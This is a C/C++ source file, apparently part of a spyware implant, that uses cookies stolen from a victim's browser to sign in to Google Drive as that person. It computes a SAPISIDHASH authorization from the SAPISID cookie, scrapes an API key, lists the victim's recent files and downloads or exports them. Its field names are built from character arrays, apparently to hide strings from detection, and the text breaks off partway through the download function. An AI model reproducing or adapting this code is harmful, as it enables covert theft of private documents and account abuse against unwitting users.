#include <Windows.h>
#include <stdio.h>
#include <time.h>
#include "social.h"
#include "globals.h"
#include "proto.h"
#include "debug.h"
#include "zmem.h"
#include "utils.h"
#include "facebook.h"
#include "JSON.h"
#include "googledocs.h"
#include "log_cloudfile.h"
#include "conf.h"
#include "version.h"
#include "base64.h"

#include "sha1.h"


//google docs handler
DWORD GoogleDocsHandler(LPSTR pszCookie)
{
	if (!ConfIsModuleEnabled(L"file"))
		return SOCIAL_REQUEST_SUCCESS;

	#ifdef _DEBUG
		OutputDebug(L"[*] GoogleDocsHandler\n");
	#endif	

	GD_PARAMS Params;	
	DWORD	  dwRet, dwErr = SOCIAL_REQUEST_BAD_COOKIE;
	GD_FILE_LIST DocList  = {0};
	GD_FILE_LIST FileList = {0};
	
	SecureZeroMemory(&Params, sizeof(Params));

	dwRet = GD_GetAuthParams(&Params, pszCookie);
	if(dwRet == GD_E_SUCCESS)
	{
		LPWSTR pwszFilter[] = {L"zip", L"pdf", L"xlsx", L"xls", L"doc", L"docx", L"txt", L"\0"};

		//get the list of files to download
		dwRet = GD_GetFileList_V2(&DocList, &FileList, &Params, pwszFilter, pszCookie);
		if(dwRet == GD_E_SUCCESS)
		{
			//download the documents
			dwRet = GD_DownloadFiles(&DocList, &Params, pszCookie);
			if(dwRet == GD_E_SUCCESS)
				dwErr = SOCIAL_REQUEST_SUCCESS;

			//download the files
			dwRet = GD_DownloadFiles(&FileList, &Params, pszCookie);
			if(dwRet == GD_E_SUCCESS)
				dwErr = SOCIAL_REQUEST_SUCCESS;
		}
		else if((dwRet == GD_E_SKIP_FILE) && ((DocList.Items == 0) && (FileList.Items == 0)))
		{
			//no more files to donwload
			dwErr = SOCIAL_REQUEST_SUCCESS;
		}
	}
	
	GD_DeleteFileList(&DocList.List);

	GD_DeleteFileList(&FileList.List);

	//delete the connection parameters
	GD_DeleteConnParams(&Params);

	return dwErr;
}


//delete all the connection parameters
void GD_DeleteConnParams(PGD_PARAMS pParams)
{
	znfree(&pParams->pszDriveID);
	znfree(&pParams->pszToken);
	znfree(&pParams->pszDevKey);
	znfree(&pParams->pszAuthHash);
	znfree(&pParams->pszAuthOrig);

	pParams->dwTimestampDoc  = 0;
	pParams->dwTimestampFile = 0;
}

/*
[
	["xsrf","AC4w5VgABCLsQkl7BPDhBSxn6tgdB5R2Gg:1419841504609",["09281402559468684799"]],
	"YYkyuUoBAAA.A6hzlcceztZTn8iCc-cK8g.PmEyMCnH8bFPh1aUpr4SxA",
	"https://drive.google.com/drive?authuser\u003d0"
]
*/
//get the token parameter and the developer key
DWORD GD_ExtractConnParams(LPSTR pszBuffer, PGD_PARAMS pParams)
{
	LPSTR pszTmp = NULL;
	int	i=0;

	//znfree(&pParams->pszToken);

	////search the string "xsrf"
	//pszTmp = strstr(pszBuffer, "xsrf\"");
	//if(pszTmp == NULL)
	//{
	//	//#ifdef _DEBUG
	//	//	OutputDebugString(L"[!] Connection parameter not found (xsrf).");
	//	//#endif

	//	return GD_E_NO_PARAMS;
	//}
	//pszBuffer = pszTmp;

	////search 3 ','
	//for(i=0; (i<3) && (pszTmp != NULL); i++)
	//{
	//	pszTmp = strstr(pszTmp, ",");
	//	if(pszTmp)
	//		pszTmp += 1;
	//}
	//if(pszTmp == NULL)
	//{
	//	//#ifdef _DEBUG
	//	//	OutputDebugString(L"[!] Connection parameter not found (0).");
	//	//#endif
	//	
	//	return GD_E_NO_PARAMS;
	//}

	////skip the first " char
	//pszTmp += 1;

	////get the token string till the next " char ("o3Ujh0oBAAA.A6hzlcceztZTn8iCc-cK8g.5ijjtnDaZyB3wsee3f9saQ")
	//for(i=0; (i<60) && (pszTmp[i] != 0); i++)
	//{
	//	if(pszTmp[i] == '"')
	//	{
	//		i += 1;
	//		pParams->pszToken = (LPSTR)malloc(i);
	//		if(pParams->pszToken == NULL)
	//		{
	//			//#ifdef _DEBUG
	//			//	OutputDebugString(L"[!] Memory allocation failed (token).");
	//			//#endif

	//			return GD_E_ALLOC;
	//		}

	//		SecureZeroMemory(pParams->pszToken, i);
	//		//save the token
	//		strncpy_s(pParams->pszToken, i, pszTmp, i-1);

	//		break;
	//	}
	//}

	//if(pParams->pszToken == NULL)
	//{
	//	//#ifdef _DEBUG
	//	//	OutputDebugString(L"[!] Connection parameter not found (token).");
	//	//#endif

	//	return GD_E_NO_PARAMS;
	//}

	/* get the developer key (es: AIzaSyAy9VVXHSpS2IJpptzYtGbLP3-3_l0aBk4)
	"drive_main","drive_fe_2014.50-Thu_RC5"],[1,1,["AHbMEF2xKMrXFXg+8RfBN+PRo5nX8BN2L9BS9qxaztiVegpHbMeyhKjFEWfDRB6gac30WQELDPmq"],
	"AIzaSyAy9VVXHSpS2IJpptzYtGbLP3-3_l0aBk4"
	*/
	
	//search the string "drive_main",
	pszTmp = strstr(pszBuffer, "drive_main\",");
	if(pszTmp == NULL)
	{
		//#ifdef _DEBUG
		//	OutputDebugString(L"[!] Connection parameter not found (drive_main).");
		//#endif
		
		return GD_E_NO_PARAMS;
	}

	//search 2 "]"
	for(i=0; (i<2) && (pszTmp != NULL); i++)
	{
		pszTmp = strstr(pszTmp, "]");
		if(pszTmp)
			pszTmp += 1;
	}	
	if(pszTmp == NULL)
	{
		#ifdef _DEBUG
			OutputDebugString(L"[!] Connection parameter not found (1).");
		#endif		

		return GD_E_NO_PARAMS;
	}

	//search the firts " char
	pszTmp = strstr(pszTmp, "\"");
	if(pszTmp == NULL)
	{
		//#ifdef _DEBUG
		//	OutputDebugString(L"[!] Connection parameter not found (2).");
		//#endif
		
		return GD_E_NO_PARAMS;
	}
	pszTmp += 1;

	//get the developer key string till the next " char ("AIzaSyAy9VVXHSpS2IJpptzYtGbLP3-3_l0aBk4")
	for(i=0; (i<50) && (pszTmp[i] != 0); i++)
	{
		if(pszTmp[i] == '"')
		{
			i += 1;
			pParams->pszDevKey = (LPSTR)malloc(i);
			if(pParams->pszDevKey == NULL)
			{
				//#ifdef _DEBUG
				//	OutputDebugString(L"[!] Memory allocation failed (key).");
				//#endif

				return GD_E_ALLOC;
			}
			SecureZeroMemory(pParams->pszDevKey, i);

			//save the token
			strncpy_s(pParams->pszDevKey, i, pszTmp, i-1);

			return GD_E_SUCCESS;
		}
	}

	return GD_E_NO_PARAMS;
}



//convert the 5 dword of sha1 in a hex string
char *GD_Sha1ToHex(unsigned int pszHash[5])
{
	char *pszHex = (char*)malloc(128);
	memset(pszHex, 0, 128);

	for(int i=0, j=0; i < 5; i++, j+=8)
	{
		sprintf(&pszHex[j], "%08x", pszHash[i]);
	}	

	return pszHex;
}


LPSTR GD_ExtractCookie(LPSTR pszCookieName, LPSTR pszCookie)
{
	LPSTR pBuf=NULL, pEnd=NULL, pszVal=NULL;
	DWORD dwLen=0;

	if((pszCookieName == NULL) || (pszCookie == NULL))
		return NULL;

	//extract the cookie value
	pBuf = strstr(pszCookie, pszCookieName);
	if(pBuf == NULL)
	{
		return NULL;
	}
	
	//extract the cookie value
	pBuf += strlen(pszCookieName) + 1; //add 1 char for the '='
	pEnd = strstr(pBuf, ";");
	if(!pEnd)
	{
		pEnd =  pBuf;
		pEnd += strlen(pBuf);
	}

	dwLen = pEnd - pBuf;

	pszVal = (LPSTR)zalloc(dwLen+1);
	if(pszVal == NULL)
	{
		return NULL;
	}

	strncpy(pszVal, pBuf, dwLen);

	return pszVal;
}

//connect to google drive and extract connection parameters
DWORD GD_GetAuthParams(PGD_PARAMS pParams, LPSTR pszCookie)
{
	LPWSTR  pwszHeader=NULL, pwszURI=NULL;
	LPSTR	pszRecvBuffer=NULL;
	DWORD	dwRet, dwBufferSize=0, dwSize=0, dwLen=0;
	CHAR    pszBuf[128];	

	//search for the SAPISID cookie necessary for the authentication process
	LPSTR pszSAPISID = GD_ExtractCookie("SAPISID", pszCookie);
	if(pszSAPISID == NULL)
	{
		return GD_E_MISSING_COOKIE;
	}

	dwSize = 2048;
	pwszHeader = (LPWSTR)malloc(dwSize * sizeof(WCHAR));
	pwszURI    = (LPWSTR)malloc(dwSize * sizeof(WCHAR));
	
	//get conn parameters
	//swprintf_s(pwszHeader, dwSize, L"Host: drive.google.com\r\nConnection: keep-alive\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nUser-Agent: %s\r\nReferer: https://drive.google.com/?authuser=0\r\nAccept-Language: it-IT,it;q=0.8,en-US;q=0.6,en;q=0.4", SOCIAL_USER_AGENT);	
	wcscpy_s(pwszHeader, dwSize, L"Host: drive.google.com\r\nConnection: keep-alive\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nReferer: https://drive.google.com/?authuser=0\r\nAccept-Language: it-IT,it;q=0.8,en-US;q=0.6,en;q=0.4");
	dwRet = HttpSocialRequest(L"drive.google.com",
							  L"GET", 
							  L"/drive/?rfd=1",
							  pwszHeader, 
							  443, 
							  NULL, 
							  0, 
							  (LPBYTE *)&pszRecvBuffer, 
							  &dwBufferSize, 
							  pszCookie);
	SecureZeroMemory(pwszURI, dwSize);

	if((dwRet != SOCIAL_REQUEST_SUCCESS) || (dwBufferSize == 0))
	{
		znfree(&pszRecvBuffer);
		znfree(&pwszHeader);
		znfree(&pwszURI);
	}

	//extract the token value
	dwRet = GD_ExtractConnParams(pszRecvBuffer, pParams);
	znfree(&pszRecvBuffer);

	if(dwRet != GD_E_SUCCESS)
	{
		return dwRet;
	}

	//origin url
	pParams->pszAuthOrig = (LPSTR)zalloc(strlen("https://drive.google.com") + 1);
	strcpy(pParams->pszAuthOrig, "https://drive.google.com");

	//hash the cookie with other values	
	SHA1Context pSha1Context;

	//hash the SAPISID cookie and the value of the 'Origin' header in the next HTTP request
	sprintf(pszBuf, "%s %s", pszSAPISID, pParams->pszAuthOrig);	
	znfree(&pszSAPISID);

	SHA1Reset(&pSha1Context);
	SHA1Input(&pSha1Context, (const UCHAR*)pszBuf, strlen(pszBuf));
	SHA1Result(&pSha1Context);
	pParams->pszAuthHash = GD_Sha1ToHex(pSha1Context.Message_Digest);

	//get some account information
	swprintf_s(pwszHeader,
			   dwSize,
			   L"Host: clients6.google.com\r\nConnection: keep-alive\r\nOrigin: %S\r\nX-JavaScript-User-Agent: google-api-javascript-client/0.1\r\nX-Goog-AuthUser: 0\r\nAuthorization: SAPISIDHASH %S\r\nAccept: */*\r\nReferer: https://drive.google.com/drive/\r\nAccept-Language: it-IT,it;q=0.8,en-US;q=0.6,en;q=0.4",
			   pParams->pszAuthOrig, pParams->pszAuthHash);

	//L"/drive/v2internal/about?fields=kind%2Cuser%2CrootFolderId&key=AIzaSyAy9VVXHSpS2IJpptzYtGbLP3-3_l0aBk4",
	swprintf_s(pwszURI, dwSize, L"/drive/v2internal/about?fields=kind%%2Cuser%%2CrootFolderId&key=%S", pParams->pszDevKey);

	dwRet = HttpSocialRequest(L"clients6.google.com",
							  L"GET",
							  pwszURI,							  
							  pwszHeader,
							  443, 
							  NULL, 
							  0, 
							  (LPBYTE *)&pszRecvBuffer,
							  &dwBufferSize, 
							  pszCookie);
	znfree(&pwszHeader);
	znfree(&pwszURI);

	//#ifdef _DEBUG
	//	if(pszRecvBuffer)
	//		GD_DumpBuffer(L"k:\\GDocs\\gd_accountinfo.html", pszRecvBuffer, strlen(pszRecvBuffer));
	//#endif

	if((dwRet != SOCIAL_REQUEST_SUCCESS) || (pszRecvBuffer == NULL))
	{	
		znfree(&pszRecvBuffer);		
		return GD_E_HTTP;
	}

	JSONValue *jValue;
	JSONObject jObj;

	//parse the list (json structure)
	jValue = JSON::Parse(pszRecvBuffer);

	//free buffer
	znfree((LPVOID*)&pszRecvBuffer);

	if(jValue == NULL)
		return GD_E_INVALID_JSON_DATA;

	//get the root folder id
	if(jValue->IsObject())
	{
		jObj = jValue->AsObject();

		if(jObj[L"rootFolderId"]->IsString())
		{
			dwSize = wcslen(jObj[L"rootFolderId"]->AsString().c_str());
			if(dwSize > 0)
			{
				size_t dwConv = 0;

				pParams->pszDriveID = (LPSTR)zalloc(dwSize+1);
				wcstombs_s(&dwConv, pParams->pszDriveID, dwSize+1, jObj[L"rootFolderId"]->AsString().c_str(), _TRUNCATE);

				if(dwConv == 0)
				{
					znfree(&pParams->pszDriveID);
					delete jValue;
					return GD_E_GENERIC;
				}
			}
		}
	}

	//free json structure
	delete jValue;

	return GD_E_SUCCESS;
}


//return the file type parsing the json file array
GD_ITEM_TYPE GD_GetFileType(JSONObject jObj)
{	
	WCHAR szMimeType[] = { L'm', L'i', L'm', L'e', L'T', L'y', L'p', L'e', L'\0'};
	WCHAR szFileSize[] = { L'f', L'i', L'l', L'e', L'S', L'i', L'z', L'e', L'\0'};
	WCHAR szFileExt[]  = { L'f', L'i', L'l', L'e', L'E', L'x', L't', L'e', L'n', L's', L'i', L'o', L'n', L'\0'};

	if(!jObj[szMimeType]->IsString())
		return GD_ITEM_UNKNOWN;	
	
	//verify if it's a directory
	if(StrStrI(jObj[szMimeType]->AsString().c_str(), L"google-apps.folder") != NULL)
		return GD_ITEM_DIR;

	//verify if it's a google spreadsheet (xlsx)
	if(StrStrI(jObj[szMimeType]->AsString().c_str(), L"google-apps.spreadsheet") != NULL)
		return GD_ITEM_XLS;

	//verify if it's a google spreadsheet (xlsx)
	if(StrStrI(jObj[szMimeType]->AsString().c_str(), L"google-apps.ritz") != NULL)
		return GD_ITEM_XLS;	

	//verify if it's a google presentation (ppt)
	if(StrStrI(jObj[szMimeType]->AsString().c_str(), L"google-apps.presentation") != NULL)
		return GD_ITEM_PPT;	

	//verify if it's a google presentation (ppt)
	if(StrStrI(jObj[szMimeType]->AsString().c_str(), L"google-apps.punch") != NULL)
		return GD_ITEM_PPT;

	//verify if it's a google drawing (jpg)
	if(StrStrI(jObj[szMimeType]->AsString().c_str(), L"google-apps.drawing") != NULL)
		return GD_ITEM_JPG;	

	//verify if it's a google document (docx)
	if(StrStrI(jObj[szMimeType]->AsString().c_str(), L"google-apps.document") != NULL)
		return GD_ITEM_DOC;	

	//verify if it's a google document (docx)
	if(StrStrI(jObj[szMimeType]->AsString().c_str(), L"google-apps.kix") != NULL)
		return GD_ITEM_DOC;	

	//check the file size
	if(!jObj[szFileSize]->IsString())
		return GD_ITEM_UNKNOWN;

	if(jObj[szFileSize]->AsString().c_str() == NULL)
		return GD_ITEM_UNKNOWN;

	return GD_ITEM_FILE;
}


//verify if the size of the file is valid and return the size in bytes
DWORD GD_GetFileSize(JSONObject jFileObj, GD_ITEM_TYPE FileType)
{
	WCHAR pwszFileSize[] = { L'f', L'i', L'l', L'e', L'S', L'i', L'z', L'e', L'\0'};
	double dSize = 0;

	//get file size (continue if the file size is not a number of if the size is 0)
	if(!jFileObj[pwszFileSize]->IsString())
		return 0;

	//if the file size is not a number
	dSize = _wtof(jFileObj[pwszFileSize]->AsString().c_str());
	if((dSize == 0) && (FileType == GD_ITEM_FILE))
		return 0;

	if(((DWORD)dSize) > GD_MAX_FILE_SIZE)
		return 0;

	return ((DWORD)dSize);
}


//get google_drive and google_docs file list
DWORD GD_GetFileList_V2(PGD_FILE_LIST pDocList, PGD_FILE_LIST pFileList, PGD_PARAMS pParams, LPWSTR *pwszFileType, LPSTR pszCookie)
{	
	LPWSTR	  pwszHeader=NULL, pwszURI=NULL;
	LPSTR	  pszRecvBuffer=NULL, pszSendBuffer=NULL;
	DWORD	  dwRet, dwBufferSize=0, dwFiles=0, i=0, dwSize=0, dwNrMail=100;
	JSONValue *jValue;
	JSONObject jObj;
	JSONArray jFiles, jArray;

	dwSize		= 2048;
	pwszHeader  = (LPWSTR)zalloc(dwSize*sizeof(WCHAR));
	pwszURI     = (LPWSTR)zalloc(dwSize*sizeof(WCHAR));

	//file request
	swprintf_s(pwszHeader,
			   dwSize,
			   L"Host: clients6.google.com\r\nConnection: keep-alive\r\nOrigin: %S\r\nX-JavaScript-User-Agent: google-api-javascript-client/0.1\r\nX-Goog-AuthUser: 0\r\nAuthorization: SAPISIDHASH %S\r\nAccept: */*\r\nReferer: https://drive.google.com/drive/\r\nAccept-Language: it-IT,it;q=0.8,en-US;q=0.6,en;q=0.4",
			   pParams->pszAuthOrig, pParams->pszAuthHash);

	//L"/drive/v2internal/files?q=trashed%20%3D%20false&fields=kind%2Citems(kind%2CcreatedDate%2Cdescription%2CfileExtension%2CfileSize%2Cid%2ClastViewedByMeDate%2CmimeType%2CmodifiedDate%2Ctitle)&appDataFilter=NO_APP_DATA&maxResults=50&sortBy=LAST_MODIFIED&reverseSort=false&key=AIzaSyAy9VVXHSpS2IJpptzYtGbLP3-3_l0aBk4",
	swprintf_s(pwszURI,
			   dwSize,
			   //OK //L"/drive/v2internal/files?q=trashed%%20%%3D%%20false&fields=kind%%2Citems(kind%%2CcreatedDate%%2Cdescription%%2CfileExtension%%2CfileSize%%2Cid%%2ClastViewedByMeDate%%2CmimeType%%2CmodifiedDate%%2Ctitle)&appDataFilter=NO_APP_DATA&maxResults=%d&sortBy=LAST_MODIFIED&reverseSort=false&key=%S",
			   L"/drive/v2internal/files?q=trashed%%20%%3D%%20false&fields=kind%%2Citems(kind%%2CcreatedDate%%2Cdescription%%2CfileExtension%%2CfileSize%%2Cid%%2ClastViewedByMeDate%%2CmimeType%%2CmodifiedDate%%2Ctitle%%2Cparents(kind%%2Cid%%2CisRoot))&appDataFilter=NO_APP_DATA&maxResults=%d&sortBy=LAST_MODIFIED&reverseSort=false&key=%S",
			   dwNrMail, pParams->pszDevKey);
	

	dwRet = HttpSocialRequest(L"clients6.google.com",
							  L"GET",
							  //L"/drive/v2internal/files?q=trashed%20%3D%20false&spaces=DRIVE&maxResults=150&sortBy=LAST_MODIFIED&key=AIzaSyAy9VVXHSpS2IJpptzYtGbLP3-3_l0aBk4",							  
							  pwszURI,
							  pwszHeader,
							  443, 
							  NULL, 
							  0, 
							  (LPBYTE *)&pszRecvBuffer,
							  &dwBufferSize, 
							  pszCookie);
	
	znfree(&pwszURI);
	znfree(&pwszHeader);
	#ifdef _DEBUG
		if(pszRecvBuffer)
			GD_DumpBuffer(L"k:\\GDocs\\gd_filelist.html", pszRecvBuffer, strlen(pszRecvBuffer));
	#endif

	if((dwRet != SOCIAL_REQUEST_SUCCESS) || (dwBufferSize < 6))
	{
		znfree(&pszRecvBuffer);
		return GD_E_HTTP;
	}	

	//parse the list (json structure)
	jValue = JSON::Parse(pszRecvBuffer);	

	znfree(&pszRecvBuffer);

	if(jValue != NULL)
	{
		//get the last saved timestamp for documents
		dwRet = GD_GetLastTimeStamp("DC", &pParams->dwTimestampDoc, pParams->pszDriveID);
		if(dwRet != GD_E_SUCCESS)
		{
			delete jValue;
			return GD_E_GENERIC;
		}

		//get the last saved timestamp for files
		dwRet = GD_GetLastTimeStamp("FL", &pParams->dwTimestampFile, pParams->pszDriveID);
		if(dwRet != GD_E_SUCCESS)
		{
			delete jValue;
			return GD_E_GENERIC;
		}

		if(jValue->IsObject())
		{
			jObj = jValue->AsObject();

			if(jObj[L"items"]->IsArray())
			{
				//array of objects
				jArray = jObj[L"items"]->AsArray();
		
				SecureZeroMemory(pFileList, sizeof(GD_FILE_LIST));

				//loop the array of objects
				for(DWORD i=0; i<jArray.size(); i++)
				{
					if(!jArray[i]->IsObject())
						continue;

					//file object
					jObj = jArray[i]->AsObject();

					PGD_FILE pFile = NULL;

					//get file information (id, size and timestamp)
					dwRet = GD_GetFileInfo_V2(&pFile, jObj, pParams->dwTimestampDoc, pParams->dwTimestampFile);
					if(dwRet == GD_E_SUCCESS)
					{
						int  nPos=0;
						BOOL bAdded=FALSE;

						//filter by file extension
						for(int j=0; pwszFileType[j][0] != 0; j++)
						{
							//length of the filetype
							nPos = wcslen(pFile->pwszFileName) - wcslen(pwszFileType[j]);
							if(nPos < 0)
								continue;

							//verify if file extension matches
							if(_wcsicmp(&pFile->pwszFileName[nPos], pwszFileType[j]))
								continue;

							if(GD_IsGoogleDoc(pFile->FileType))
							{
								//add to the document list
								GD_AddFileToList(&pDocList->List, pFile);
								//increase the files number
								pDocList->Items++;
							}
							else
							{
								//add to the file list
								GD_AddFileToList(&pFileList->List, pFile);
								//increase the files number
								pFileList->Items++;
							}

							bAdded = TRUE;

							break;
						}

						if(!bAdded)
						{
							GD_DeleteFile(pFile);
							pFile = NULL;
						}
					}
					else
					{	
						GD_DeleteFile(pFile);
						pFile = NULL;

						if((dwRet == GD_E_SKIP_FILE) && ((pFileList->Items > 0) || (pDocList->Items > 0)))
							dwRet = GD_E_SUCCESS;
					}
				}

				#ifdef _DEBUG
				if(pDocList->Items > 0)
					GD_PrintList(pDocList->List);
				if(pFileList->Items > 0)
					GD_PrintList(pFileList->List);
				#endif
			}
		}
	}
	else
	{
		//#ifdef _DEBUG
		//	OutputDebugString(L"[!] Parsing JSON data failed (GD_GetFileList(JSON))");
		//#endif
			
		dwRet = GD_E_GENERIC;
	}
	
	delete jValue;

	return dwRet;
}

//get the timestamp of the file (modified date or creation date)
//the date is in format 2015-01-22T16:18:24.166Z
DWORD GD_GetFileTimestamp(JSONObject jFileObj)
{	
	WCHAR  pwszModDate[]	= { L'm', L'o', L'd', L'i', L'f', L'i', L'e', L'd', L'D', L'a', L't', L'e', L'\0'};
	WCHAR  pwszCreateDate[] = { L'c', L'r', L'e', L'a', L't', L'e', L'D', L'a', L't', L'e', L'\0'};
	WCHAR  pwszBuf[32] = {0};
	DWORD  dwLen=0;
	INT64  iTime64;
	struct tm time;
	
	//get time stamp
	if((!jFileObj[pwszModDate]->IsString()) || (jFileObj[pwszModDate]->AsString().c_str() == NULL))
		return 0;
	
	wcscpy_s(pwszBuf, sizeof(pwszBuf)/2, jFileObj[pwszModDate]->AsString().c_str());

	dwLen = wcslen(pwszBuf);	
	if(dwLen < 18)
		return 0;

	SecureZeroMemory(&time, sizeof(time));
	//extract the date
	time.tm_year = _wtoi(&pwszBuf[0]) - 1900;
	time.tm_mon  = _wtoi(&pwszBuf[5]) - 1;
	time.tm_mday = _wtoi(&pwszBuf[8]);

	time.tm_hour = _wtoi(&pwszBuf[11]);
	time.tm_min  = _wtoi(&pwszBuf[14]);
	time.tm_sec  = _wtoi(&pwszBuf[17]);	

	iTime64 = _mkgmtime64(&time);
	if(iTime64 == -1)
		return 0;
	
	return (DWORD)iTime64;
}

//extract file info from a json array
DWORD GD_GetFileInfo_V2(PGD_FILE *pFile, JSONObject jFileObj, DWORD dwSavedTimestampDoc, DWORD dwSavedTimestampFile)
{	
	WCHAR		 pwszFileID[]	= { L'i', L'd', L'\0'};
	WCHAR		 pwszFileName[]	= { L't', L'i', L't', L'l', L'e', L'\0'};
	DWORD		 i=0, dwSize=0, dwFileSize=0, dwTimestamp=0, dwCmpTimestamp=0;
	GD_ITEM_TYPE FileType;
	PGD_FILE	 pNewFile = NULL;
	
	if(jFileObj.size() == 0)
		return GD_E_INVALID_JSON_DATA;

	//verify if it's a file or a directory
	if(jFileObj[L"kind"]->IsString())
	{
		if(_wcsicmp(jFileObj[L"kind"]->AsString().c_str(), L"drive#file"))
			return GD_E_SKIP_FILE;
	}

	//check the file id
	if(!jFileObj[pwszFileID]->IsString())
		return GD_E_SKIP_FILE;
	if(jFileObj[pwszFileID]->AsString().c_str() == NULL)
		return GD_E_SKIP_FILE;

	//get the file type
	FileType = GD_GetFileType(jFileObj);
	if((FileType == GD_ITEM_UNKNOWN) || (FileType == GD_ITEM_DIR))
		return GD_E_SKIP_FILE;

	//check the file size except for google docs (we don't have the size)
	if(!GD_IsGoogleDoc(FileType))
	{	
		dwFileSize = GD_GetFileSize(jFileObj, FileType);
		if(dwFileSize == 0)
			return GD_E_SKIP_FILE;

		dwCmpTimestamp = dwSavedTimestampFile;
	}
	else 
	{
		dwCmpTimestamp = dwSavedTimestampDoc;
	}

	dwTimestamp = GD_GetFileTimestamp(jFileObj);
		
	//if the timestamp is < than the last one saved, skip the file
	if(dwTimestamp <= dwCmpTimestamp)		
		return GD_E_SKIP_FILE;

	//create a new file struct
	*pFile = (PGD_FILE)malloc(sizeof(GD_FILE));
	if(*pFile == NULL)
	{
		//#ifdef _DEBUG
		//OutputDebugString(L"[!] Memory allocation failed (GD_GetFileInfo(File))");
		//#endif

		return GD_E_ALLOC;
	}
	pNewFile = *pFile;	
	SecureZeroMemory(pNewFile, sizeof(GD_FILE));
	
	//get the file id
	dwSize = wcslen(jFileObj[pwszFileID]->AsString().c_str()) + 1;
	pNewFile->pwszFileID = (LPWSTR)zalloc(dwSize * sizeof(WCHAR));
	if(pNewFile->pwszFileID == NULL)
	{
		znfree((LPVOID*)pFile);

		//#ifdef _DEBUG
		//OutputDebugString(L"[!] Memory allocation failed (GD_GetFileInfo(FileID))");
		//#endif

		return GD_E_ALLOC;
	}
	wcscpy_s(pNewFile->pwszFileID, dwSize, jFileObj[pwszFileID]->AsString().c_str());

	//get the file name
	WCHAR pwszRoot[] = { L'c', L'l', L'o', L'u', L'd', L':', L'\\', L'G', L'o', L'o', L'g', L'l', L'e', L'D', L'r', L'i', L'v', L'e', L'\\', L'\0'};

	if(jFileObj[pwszFileName]->IsString())
	{
		dwSize = wcslen(jFileObj[pwszFileName]->AsString().c_str()) + wcslen(pwszRoot) + 1;
		pNewFile->pwszFileName = (LPWSTR)malloc(dwSize * sizeof(WCHAR));
		if(pNewFile->pwszFileName == NULL)
		{
			znfree((LPVOID*)&pNewFile->pwszFileID);
			znfree((LPVOID*)pFile);				

			#ifdef _DEBUG
			OutputDebugString(L"[!] Memory allocation failed (GD_GetFileInfo(FileName))");
			#endif

			return GD_E_ALLOC;
		}
		swprintf_s(pNewFile->pwszFileName, dwSize, L"%s%s", pwszRoot, jFileObj[pwszFileName]->AsString().c_str());
		//wcscpy_s(pNewFile->pwszFileName, dwSize, jFileObj[pwszFileName]->AsString().c_str());

		//if the file is a google document, append the extension according to file type
		if(GD_IsGoogleDoc(FileType))
			GD_AddFileExtension(&pNewFile->pwszFileName, FileType);
	}
	else
	{
		return GD_E_INVALID_JSON_DATA;
	}

	//file timestamp
	pNewFile->dwTimestamp = dwTimestamp;

	//save the file type
	pNewFile->FileType = FileType;

	//file size
	pNewFile->dwFileSize = dwFileSize;

	return GD_E_SUCCESS;
}



DWORD GD_GetFile(PGD_FILE pFile,  PGD_PARAMS pParams, LPSTR pszCookie)
{		
	LPWSTR pwszURI=NULL, pwszHost=NULL, pwszHeader=NULL, pwszFrom=NULL, pwszTo=NULL;
	LPSTR  pszRecvBuf=NULL;
	DWORD  dwBufferSize=0, dwRet, dwSize=0;

	pwszURI = (LPWSTR)zalloc(1024 * sizeof(WCHAR));
	if(pwszURI == NULL)
		return GD_E_ALLOC;

	pwszHost = (LPWSTR)zalloc(256 * sizeof(WCHAR));
	if(pwszURI == NULL)
	{
		znfree(&pwszURI);
		return GD_E_ALLOC;
	}

	pwszHeader = (LPWSTR)zalloc(1024 * sizeof(WCHAR));
	if(pwszHeader == NULL)
	{
		znfree(&pwszURI);
		znfree(&pwszHost);
		return GD_E_ALLOC;					
	}

	switch(pFile->FileType)
	{
		case GD_ITEM_DOC:
			swprintf_s(pwszURI, 1024, L"/document/d/%s/export?format=docx",		pFile->pwszFileID);
		break;
				
		case GD_ITEM_XLS:
			swprintf_s(pwszURI, 1024, L"/spreadsheets/d/%s/export?format=xlsx",	pFile->pwszFileID);					
		break;

		case GD_ITEM_PPT:
			swprintf_s(pwszURI, 1024, L"/presentation/d/%s/export/pptx",		pFile->pwszFileID);
		break;

		case GD_ITEM_JPG:					
			swprintf_s(pwszURI, 1024, L"/drawings/d/%s/export/jpeg",			pFile->pwszFileID);
		break;

		case GD_ITEM_FILE:
			swprintf_s(pwszURI, 1024, L"/uc?id=%s&authuser=0&export=download",	pFile->pwszFileID);
		break;
	}

	#ifdef _DEBUG
	OutputDebugStringA(pszCookie);
	OutputDebugStringA("\r\n");
	#endif 

	//http request
	if(GD_IsGoogleDoc(pFile->FileType))	
	{
		wcscpy_s(pwszHost, 256, L"docs.google.com");

		dwRet = HttpSocialRequest(pwszHost,
									L"GET",
									pwszURI,
									L"Connection: keep-alive\r\nAccept: */*",
									443, 
									NULL, 
									0, 
									(LPBYTE *)&pszRecvBuf,
									&dwBufferSize, 
									pszCookie,
									GD_MAX_FILE_SIZE);
		znfree(&pwszURI);
		znfree(&pwszHost);
		znfree(&pwszHeader);

		if(dwRet != SOCIAL_REQUEST_SUCCESS)
		{
			znfree(&pszRecvBuf);		
			return GD_E_HTTP;
		}

		//check doc size
		if(dwBufferSize > GD_MAX_FILE_SIZE)
		{
			znfree(&pszRecvBuf);		
			return GD_E_FILESIZE;
		}

	}
	else
	{
		znfree(&pszRecvBuf);
		wcscpy_s(pwszHost, 256, L"drive.google.com");

		//swprintf(pwszHeader, L"Connection: keep-alive\r\nOrigin: %S\r\nContent-Type: application/x-www-form-urlencoded;charset=utf-8\r\nAuthorization: SAPISIDHASH %S\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nReferer: https://drive.google.com",
		//		 pParams->pszAuthOrig, pParams->pszAuthHash);
		dwRet = HttpSocialRequest(pwszHost,
									L"POST",
									pwszURI,
									L"Content-Type: application/x-www-form-urlencoded;charset=utf-8\r\n",
									443, 
									NULL, 
									0, 
									(LPBYTE *)&pszRecvBuf,
									&dwBufferSize, 
									pszCookie);

		if((dwRet != SOCIAL_REQUEST_SUCCESS) || (dwBufferSize < 5))
		{
			znfree(&pwszURI);
			znfree(&pwszHost);
			znfree(&pszRecvBuf);
			znfree(&pwszHeader);
			return GD_E_HTTP;
		}

		//parse the returned json struct
		JSONValue *jValue=NULL;
		JSONObject jObj;

		jValue = JSON::Parse(&pszRecvBuf[5]);

		//free buffer
		znfree((LPVOID*)&pszRecvBuf);

		if(jValue != NULL)
		{
